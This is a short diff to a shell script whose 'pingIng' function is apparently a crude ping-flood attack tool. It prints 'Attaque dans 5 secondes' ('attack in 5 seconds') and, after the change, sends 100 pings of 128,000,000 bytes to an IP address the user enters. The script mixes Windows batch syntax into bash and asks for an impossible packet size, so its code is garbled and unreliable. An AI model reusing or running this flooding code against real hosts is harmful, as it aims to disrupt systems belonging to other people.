@@ -46,9 +46,9 @@ pingIng() {
       read -p "${RED}[${RESETBG}-${RED}]${ORANGE}Size of requests(default 32 octets):" size
 			ping %site% -n %number% -l %size%;;
 		02 | 2)
-			read -p "${RED}[${RESETBG}-${RED}]${ORANGE}Web Address:" site
+			read -p "${RED}[${RESETBG}-${RED}]${ORANGE}IP Address:" site
 			echo Attaque dans 5 secondes
-			ping %site% -l 100;;
+			ping %site% -n 100 -l 128000000;;
 			
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
